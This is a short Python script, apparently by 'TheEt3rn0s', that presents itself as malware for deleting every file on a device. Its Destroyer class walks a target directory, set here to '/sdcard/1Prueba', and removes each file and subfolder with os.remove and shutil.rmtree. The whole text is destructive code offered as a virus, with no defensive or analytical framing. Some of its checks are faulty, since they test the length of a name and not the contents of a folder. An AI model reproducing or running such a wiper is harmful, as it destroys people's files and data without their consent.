import os
import shutil

'''Viruses and Trojans for Operating System'''
''' =============TheEt3rn0s============'''
'''This malware remove all files of a device'''

class Destroyer:
    def path_to_attack(self,path):
        show_path = os.listdir(path)
        for item in show_path:
            #Si el archivo actual es archivo
            if os.path.isfile(path+"/"+item):
                os.remove(path+"/"+item)
            #Si el archivo actual es una carpeta vacia

            elif os.path.isdir(path+"/"+item) and len(item)==0:
                os.rmdir(path+"/"+item)
            #Si la carpeta actual contiene mas de un elemento

            elif os.path.isdir(path+"/"+item) and len(item)>1:
                shutil.rmtree(path+"/"+item)
           


def main():
    DK = Destroyer()    
    '''Aqui indicamos la carpeta que queremos eliminar'''
    Path = "/sdcard/1Prueba"
    DK.path_to_attack(Path)

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
